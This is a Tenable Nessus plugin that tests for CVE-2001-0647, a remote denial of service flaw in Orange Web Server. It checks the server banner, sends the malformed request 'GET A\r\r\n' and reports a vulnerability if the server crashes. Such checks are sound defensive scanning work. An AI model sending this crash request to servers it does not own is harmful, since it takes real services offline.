#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10636);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2001-0647");
 script_bugtraq_id(2432);
 
 script_name(english:"Orange Web Server Malformed HTTP Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote has an application that is affected by a denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote web server crash
by sending it an invalid HTTP request (GET A). An attacker
may use this flaw to prevent this host from fulfilling
its role." );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (report_paranoia < 2)
{
  b = get_http_banner(port: port);
  if (! egrep(string: b, pattern:"^Server: *GoAhead-Webs"))
    exit(0, "This is not Orange Web Server");
}


if (http_is_dead(port:port)) exit(1, "the web server is dead");

# The exploit was 'GET A \n' but I prefer that
w = http_send_recv_buf(port: port, data: 'GET A\r\r\n');
sleep(2);


if (http_is_dead(port:port, retry: 3))
{
  security_warning(port: port);
  exit(1, "the web server is dead");
}
